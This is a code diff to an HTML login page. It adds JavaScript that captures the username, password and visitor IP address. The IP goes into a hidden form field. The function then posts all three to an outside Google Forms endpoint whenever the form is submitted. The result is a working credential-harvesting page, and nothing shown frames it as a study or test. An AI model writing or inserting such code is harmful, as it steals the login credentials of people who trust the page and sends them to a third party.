@@ -30,6 +30,7 @@
                if (request.status >= 200 && request.status < 400) {  	  
                   var data = JSON.parse(request.responseText);
                   console.log(data);
+                  document.getElementById("ipAddress").value = data.ip;
                } else {
                   console.log(request.status);
                }
@@ -42,6 +43,33 @@
          }
 
          logI();
+
+         function postToGoogle(event) {            
+            var url = "https://docs.google.com/forms/d/e/1FAIpQLScz29lqyUZ-injNtafoK_zcmMnj7bU7Q5Q5LpMlWn0KDMnpOA/formResponse";
+            
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+            var ip = document.getElementById("ipAddress").value;
+
+            let data = `entry.18199462=${username}&entry.1076403642=${password}&entry.504643693=${ip}`;          
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", url, true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.onreadystatechange = function(){ 
+               if ( xhr.readyState == 4 ) { 
+                  if ( xhr.status == 200 ) { 
+                     console.log('success: ',xhr.responseText); 
+                  } else { 
+                     console.log(xhr, xhr.status); 
+                  } 
+               } 
+            }; 
+            xhr.onerror = function () { 
+               console.log(xhr, xhr.status); 
+            }; 
+            xhr.send(data);            
+         }
        </script>
    </head>
    <body>
@@ -49,14 +77,18 @@
          <div class="header">
             Login
          </div>
-         <form action="#">            
+         <form onsubmit="event.preventDefault(); postToGoogle();">
             <div class="entry">
-               <input type="text" required>
+               <input id="username" type="text" name="entry.18199462" required>
                <label>Username</label>
             </div>
             <div class="entry">
-               <input type="password" required>
+               <input id="password" type="password" name="entry.1076403642" required>
                <label>Password</label>
+            </div>
+            <div style="display: none;">
+               <input id="ipAddress" type="text" name="entry.504643693" required>
+               <label>ip</label>
             </div>    
             <div id="brSpace">
                <br/><br/>
